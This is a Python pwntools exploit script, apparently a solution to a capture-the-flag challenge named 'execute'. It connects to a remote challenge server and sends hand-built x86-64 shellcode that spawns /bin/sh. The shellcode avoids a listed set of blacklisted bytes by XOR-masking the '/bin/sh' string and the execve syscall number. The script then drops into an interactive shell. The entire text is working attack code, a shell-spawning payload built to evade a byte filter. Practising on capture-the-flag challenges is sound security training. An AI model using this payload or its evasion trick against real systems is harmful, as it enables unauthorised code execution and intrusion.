from pwn import *

CONNECTON_TYPE = 'remote' # 'remote' or 'local'

if CONNECTON_TYPE == 'remote':
    p = remote('94.237.54.239', 47626)
else:
    p = process('./execute')

# Blacklisted bytes: \x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67

# found at : https://gist.github.com/Reodus/153373b38b7b54b3e3034cb14122f18a
shell_code = b"\x48\xbf\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\x83\xf7\xff\x57\x48\x89\xe7\x50\x48\x89\xc6\x48\x89\xc2\xb8\x3a\x00\x00\x00\x48\x83\xf0\x01\x0f\x05"

p.recvuntil(b'everything\n')
p.sendline(shell_code)

p.interactive()



